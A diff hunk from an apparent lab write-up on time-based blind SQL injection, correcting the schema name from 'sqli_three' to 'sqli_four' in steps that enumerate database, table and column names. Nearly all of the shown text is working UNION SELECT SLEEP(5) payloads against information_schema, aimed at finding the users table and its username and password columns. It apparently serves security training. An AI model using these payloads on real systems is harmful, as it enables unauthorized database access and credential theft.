@@ -188,12 +188,12 @@ if again no pause in the response time , increase column number like
       admin123' UNION SELECT SLEEP(5),2,3 where database() like 'u%';--
 Here dabase ***name :sqli_four***     
 ### Step 3:Find out table name
-      admin123' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+      admin123' UNION SELECT SLEEp(5),2,3 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'a%';--
 Here ***table name:users***
 
 #### Step4:Find out Column name
       
-      admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+      admin123' UNION SELECT SLEEP(5),2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
 Here Column name ***username and password***
 
 #### Step5:Findout Column value
